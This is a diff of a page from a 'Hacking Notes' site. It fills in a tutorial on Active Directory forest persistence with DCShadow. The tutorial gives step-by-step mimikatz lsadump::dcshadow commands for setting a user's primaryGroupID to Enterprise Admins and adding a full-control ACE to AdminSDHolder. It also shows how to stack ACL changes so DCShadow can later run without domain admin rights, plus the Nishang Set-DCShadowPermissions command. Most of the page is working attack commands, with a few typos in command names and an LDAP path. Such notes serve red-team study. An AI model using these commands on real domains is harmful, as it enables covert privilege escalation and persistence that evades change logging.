@@ -10,13 +10,13 @@
 <meta name="generator" content="Jekyll v3.8.4" />
 <meta property="og:title" content="Forest Persistence" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="fdsf" />
-<meta property="og:description" content="fdsf" />
+<meta name="description" content="We are going to discuss some ways to do a persistence in a forest root." />
+<meta property="og:description" content="We are going to discuss some ways to do a persistence in a forest root." />
 <link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/forest-persistence/" />
 <meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/forest-persistence/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"fdsf","url":"http://0.0.0.0:4000/hackingnotes/active-directory/forest-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Forest Persistence","@context":"http://schema.org"}</script>
+{"description":"We are going to discuss some ways to do a persistence in a forest root.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/forest-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Forest Persistence","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -281,7 +281,154 @@
 				<h3>Forest Persistence</h3>
 			</div>
 			<article class="content">
-				<p>fdsf</p>
+				<p>We are going to discuss some ways to do a persistence in a forest root.</p>
+
+<h1 id="dcshadow">DCShadow</h1>
+
+<p>DCShadow temporaly registers a new DC in the target domain and uses it to push attributes like <code class="highlighter-rouge">SID History</code>, <code class="highlighter-rouge">SPNs</code> and more over on the specified object without leaving the cange logs for modified object.</p>
+
+<p>The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services.</p>
+
+<p>Due to the attributes are changed from a domain dontroller, there are no directory change logs on the actual DC for the target object.</p>
+
+<p>By default, domain administrative privileges are required to use DCShadow.</p>
+
+<p>To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>+
+<span class="o">!</span>processtoken
+lsadump::dcshadow /object:root1user /attribute:Description /value<span class="o">=</span><span class="s2">"Hello from DCShadow"</span>
+</code></pre></div></div>
+<p>And the second one with enough privileges, such as DA, will push the values:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /push
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: DCShadow can be used with minimal permissions by modifyng ACLs, <code class="highlighter-rouge">Nishang</code> has a script to set this permissions to a user.</p>
+
+  <p><code class="highlighter-rouge">Set-DCShadowPermissions -FakeDC machine-user01 -SAMAccountName root1user -Username user01 -Verbose</code></p>
+</blockquote>
+
+<h2 id="set-primary-group-id-to-enterprise-admin">Set Primary Group ID to Enterprise Admin</h2>
+
+<p>Now that we have been discovered how to overwrite attributes of users, we can change the group id of a user to the id of the enterprise administrators or domain admins.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /object:user01 /attribute:primaryGroupID /value:519
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: This makes noise, because every one who looks <code class="highlighter-rouge">net group "Enterpise Admins" /domain</code> will see that the user user01 is a member.</p>
+</blockquote>
+
+<h2 id="modify-ntsecuritydescriptor-for-adminsdholder">Modify ntSecurityDescriptor for AdminSDHolder</h2>
+
+<p>We can modify the <code class="highlighter-rouge">ntSecurityDescriptor</code> for AdminSDHolder to add full control for a user.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=AdminADHolder,CN=System,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div></div>
+<p>We just need to append a full control ACE from above DA with our users SID.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /object:CN<span class="o">=</span>AdminSDHolder,CN<span class="o">=</span>System,DC<span class="o">=</span>corp,DC<span class="o">=</span><span class="nb">local</span> /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+
+Modified ACL:
+
+ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
+0:DAG:DAD:PAI<span class="o">(</span>A;;LCRPLORC;;;AU<span class="o">)</span>  .....................  <span class="o">(</span>A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323<span class="o">)</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: We just need to add our SID to the SY/BA/DA ACE result. To see the SID we can use:</p>
+
+  <p><code class="highlighter-rouge">Get-NetUser user01</code></p>
+</blockquote>
+
+<h2 id="shadowception">Shadowception</h2>
+
+<p>We can even run DCShadow from DCShadow. To do that task we will add 4 ACL and add the following content:</p>
+
+<blockquote>
+  <p><strong>Note</strong> We can use <code class="highlighter-rouge">/stack</code> to stack multiple ACL.</p>
+</blockquote>
+
+<h3 id="domain-object">Domain Object</h3>
+
+<ul>
+  <li>List ACL:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div>    </div>
+  </li>
+  <li>Append the following ACE:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;)
+(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;&lt;USER SID&gt;)
+(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;)
+</code></pre></div>    </div>
+  </li>
+  <li>Stack the ACL
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="attacker-computer-object">Attacker Computer Object</h3>
+
+<ul>
+  <li>List ACL:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=machine01,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div>    </div>
+  </li>
+  <li>Append the following ACE:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(A;;WP;;;&lt;USER SID&gt;)
+</code></pre></div>    </div>
+  </li>
+  <li>Stack the ACL
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="target-user-object">Target User Object</h3>
+
+<ul>
+  <li>List ACL:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=user01,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div>    </div>
+  </li>
+  <li>Append the following ACE:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(A;;WP;;;&lt;USER SID&gt;)
+</code></pre></div>    </div>
+  </li>
+  <li>Stack the ACL
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="sites-configuration-object">Sites Configuration Object</h3>
+
+<ul>
+  <li>List ACL:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=Sites,CN=Configuration,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div>    </div>
+  </li>
+  <li>Append the following ACE:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(A;CI;CCDC;;;&lt;USER SID&gt;)
+</code></pre></div>    </div>
+  </li>
+  <li>Stack the ACL
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Finally we just start the server:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow
+</code></pre></div></div>
+
+<p>And on the other session with DA privileges:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /push
+</code></pre></div></div>
 
 			</article>
 		</section>
